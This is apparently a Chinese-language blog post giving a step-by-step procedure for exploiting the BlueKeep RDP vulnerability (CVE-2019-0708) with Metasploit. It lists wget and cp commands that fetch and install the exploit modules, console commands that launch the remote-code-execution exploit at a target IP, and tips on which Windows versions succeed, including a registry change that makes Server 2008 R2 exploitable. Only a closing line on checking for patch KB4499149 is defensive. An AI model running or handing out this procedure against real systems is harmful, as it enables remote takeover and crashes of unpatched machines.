上次因为消息比较重要，赶忙发了漏洞通知。


今天来详细说一下这个漏洞。


第一这个插件还没有合并的msf的发行版里面，需要自己手动安装


0x1:安装msf模块

wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb
cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/
cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/
cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/


0x2 常规的模块利用


use exploit/windows/rdp/cve_2019_0708_bluekeep_rceset rhosts 192.168.3.115set target 3exploit


0x3根据目前测试的信息和网上的已知信息汇总


1.exp会导致蓝屏，而且很大概率，谨慎使用


2.Windows7 SP1可以复现成功，win7专业版会蓝屏


3.2008 r2 withsp1 english standard需要修改注册表[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdpwd\fDisableCam]值修改为0,才能成功利用


4.查询自己是否打了补丁，cmd里面执行systeminfo,看有没有kb4499149.
